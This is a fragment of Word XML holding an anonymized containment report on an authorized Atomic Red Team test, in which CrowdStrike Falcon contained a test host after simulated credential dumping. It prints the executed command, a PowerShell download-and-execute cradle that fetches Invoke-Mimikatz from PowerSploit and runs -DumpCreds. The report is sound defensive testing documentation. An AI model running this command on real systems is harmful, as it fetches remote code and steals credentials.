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Atomic Red Team Test – Containment Report (Anonymized)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Overview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>This document records the details of an Atomic Red Team test that resulted in automatic containment of a test device by CrowdStrike Falcon due to simulated credential dumping activity.</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Device &amp; Test Information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>- Device Name: Test-Host-01</w:t>
        <w:br/>
        <w:t>- Date: April 15, 2025</w:t>
        <w:br/>
        <w:t>- User: test_user</w:t>
        <w:br/>
        <w:t>- MITRE Technique ID: T1059.001</w:t>
        <w:br/>
        <w:t>- Test Name: PowerShell Execution (Simulated Mimikatz)</w:t>
        <w:br/>
        <w:t>- Atomic Test Number: 1</w:t>
        <w:br/>
        <w:t>- Execution Method: PowerShell command invoking a simulated credential dumping script</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. CrowdStrike Detection &amp; Response</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>CrowdStrike Falcon detected the PowerShell-based execution as credential dumping activity (via Mimikatz simulation). As part of Falcon's policy, the host was automatically placed in containment to prevent lateral movement or further activity.</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Command Executed:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>cmd.exe /c powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Resolution &amp; Recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>- Host was flagged and placed in containment by CrowdStrike Falcon as expected.</w:t>
        <w:br/>
        <w:t>- Security team was notified that this activity was part of an authorized Atomic Red Team test.</w:t>
        <w:br/>
        <w:t>- Recommendation: Suppress or whitelist alerts tied to known simulation tools on designated test systems.</w:t>
        <w:br/>
        <w:t>- Resume additional testing only after the host is released from containment.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